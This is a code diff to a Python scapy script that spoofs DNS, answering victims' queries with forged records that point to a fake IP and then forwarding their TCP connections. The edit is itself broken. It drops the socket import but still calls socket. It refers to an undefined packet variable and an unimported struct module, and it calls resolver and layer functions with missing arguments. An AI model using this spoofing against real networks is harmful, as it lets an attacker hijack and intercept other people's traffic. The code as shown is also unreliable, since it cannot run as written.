@@ -1,8 +1,6 @@
-import os
 import argparse
-import socket
 
-from dns.resolver import query
+import dns.resolver
 from scapy.all import *
 from scapy.layers.dns import DNSRR, DNS
 from scapy.layers.inet import IP, UDP
@@ -68,9 +66,6 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
             connection.sendall(data)
             print(f"Sent {len(data)} bytes to client {client_address}")
 
-    connection.close()
-    host_socket.close()
-    print(f"Closed connection with client {client_address} and host {hostname}")
 
 
 def dns_callback(packet, extra_args):
@@ -82,11 +77,15 @@ def dns_callback(packet, extra_args):
         dns_response = IP(dst=packet[IP].src) / \
                        UDP(dport=packet[UDP].sport, sport=53) / \
                        DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                           an=DNSRR(rrname=query, ttl=10, rdata=extra_args['fake_ip']))
+                           an=DNSRR(rrname=dns.resolver.resolve(), ttl=10, rdata=extra_args['fake_ip']))
 
         send(dns_response, verbose=0)
-        handle_tcp_forwarding(packet[IP].src, extra_args['fake_ip'], extra_args['target_host'],
-                              extra_args['target_port'])
+        client_ip = socket.inet_ntoa(scapy_packet.getlayer(IP).src)
+        client_port = struct.unpack("!H", socket.inet_aton(scapy_packet.getlayer()))
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        client_socket.bind((client_ip, client_port))
+        handle_tcp_forwarding(client_socket, extra_args['fake_ip'], extra_args['target_host'])
 
 
 
